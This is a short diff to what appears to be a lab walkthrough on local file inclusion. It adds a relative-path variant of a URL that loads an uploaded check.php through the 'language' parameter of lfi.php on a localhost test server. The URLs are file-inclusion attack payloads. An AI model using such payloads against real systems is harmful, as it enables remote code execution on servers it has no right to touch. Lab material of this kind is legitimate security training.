@@ -50,7 +50,8 @@ Upload check.php from attacker-server src folder
 
 then:
 
-[http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check)
+- [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/check) or
+- [http://127.0.0.1:8883/lfi.php?language=uploads/check](http://127.0.0.1:8883/lfi.php?language=uploads/check)
 
 #### Exploit
 
